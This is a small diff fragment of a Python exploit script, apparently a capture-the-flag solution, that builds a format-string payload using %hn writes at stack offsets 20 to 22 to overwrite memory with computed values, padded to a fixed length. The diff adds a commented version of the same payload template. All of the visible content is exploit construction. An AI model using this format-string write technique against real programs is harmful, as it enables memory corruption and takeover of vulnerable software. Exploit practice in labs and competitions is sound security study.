@@ -99,6 +99,7 @@ first = list(sortedDict.values())[0]
 second = list(sortedDict.values())[1] - list(sortedDict.values())[0]
 third = list(sortedDict.values())[2] - list(sortedDict.values())[1]
 
+# payld = b"%{first}x%20$hn%{second}x%21$hn%{third}x%22$hn"
 payload = b"%%%dx%%20$hn%%%dx%%21$hn%%%dx%%22$hn" % (first, second, third)
 payload = payload + b"a"*(0x30-len(payload))
 for i in range(3):
